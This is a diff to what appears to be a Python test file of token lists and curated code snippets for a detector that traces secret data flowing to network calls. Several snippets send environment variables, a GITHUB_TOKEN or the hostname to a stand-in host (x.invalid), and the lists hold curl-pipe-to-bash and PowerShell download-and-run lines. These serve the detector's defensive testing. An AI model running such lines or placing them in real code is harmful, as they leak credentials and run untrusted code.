@@ -864,8 +864,36 @@ FLOW = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "{", 
         "async fetch(t) { ", "cache.fetch(", "window.fetch(", "os.environ.get('NPM_TOKEN')", "'.ssh/id_rsa.pub'",
         "urlopen('https://x.invalid/', data=", "'curl -fsSL https://x.invalid/i.sh | bash'", "execSync(", "console.log(",
         "'powershell -c \"irm https://x.invalid/i.ps1 | iex\"'", "__spreadValues({}, process.env)",
-        "spawn('npm', ['i'], ", "require('fs').readFileSync("]
+        "spawn('npm', ['i'], ", "require('fs').readFileSync(",
+        # 0.1.8's last round: a receiver's member, array destructuring, keywords, methods and callbacks
+        "this.env = ", "this.env", "this.payload", "this", "self.token = ", "self.token", "self.payload", "self",
+        "this?.env", "this['env']", "this.items.push(", "this.items.forEach((v) => ", "const [a, b] = [",
+        "const [, a] = ", "let [...rest] = ", "[a, b]", "a", "b", "rest", "function* (", "function (x) ",
+        ".then(function* (x) {})", "wrap({ \"x.js\"(exports) { ", "run(x) { ", "} })", "module.exports.x = ",
+        "process.env.X = ", "const = ", "return = "]
 FLOW_CURATED = [
+    # 0.1.8's last round: a receiver's member is followed, not the receiver; keywords name nothing; an
+    # object literal's methods and a callback given a call are code (a long text, where a name is followed
+    # only near where it was given the data: test_rust_parity_signs' LongTextFlowParityTests)
+    "class C {\n  constructor() { this.env = process.env; }\n"
+    "  send() { fetch('https://x.invalid/', {method: 'POST', body: JSON.stringify(this.env)}); }\n}\n",
+    "class C {\n  constructor() { this.env = process.env; }\n"
+    "  send() { fetch('https://x.invalid/', {method: 'POST', body: JSON.stringify(this.payload)}); }\n}\n",
+    "import os, requests\nclass C:\n    def __init__(self):\n        self.token = os.environ['GITHUB_TOKEN']\n"
+    "    def go(self):\n        requests.post('https://x.invalid/', data=self.token)\n",
+    "import os, requests\nclass C:\n    def __init__(self):\n        self.token = os.environ['GITHUB_TOKEN']\n"
+    "    def go(self):\n        requests.post('https://x.invalid/', data=self.payload)\n",
+    "const os = require('os');\nconst [host, port] = [os.hostname(), 80];\n"
+    "fetch('https://x.invalid/', {method: 'POST', body: host});\n",
+    "const os = require('os');\nconst [host, port] = [os.hostname(), 80];\n"
+    "fetch('https://x.invalid/', {method: 'POST', body: String(port)});\n",
+    "const fs = require('fs');\nfs.promises.readFile('/etc/hostname').then(function* (x) {});\n"
+    "fetch('https://x.invalid/', {method: 'POST', body: JSON.stringify({f: function () { return 1; }})});\n",
+    "var lib = wrap({ \"x.js\"(exports) { var e = process.env; exports.e = 1; } });\n"
+    "fetch('https://x.invalid/', {method: 'POST', body: JSON.stringify(lib)});\n",
+    "function run(cb) { return cb; }\nvar r = run(function () { return process.env; });\n"
+    "fetch('https://x.invalid/', {method: 'POST', body: JSON.stringify(r)});\n",
+
     # PowerShell handed to an exec call by a name given the command line
     "import subprocess\nout = 'C:/x/a.exe'\n"
     "dl = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://x.invalid/a.exe' -OutFile '{out}'\\\"\"\n"
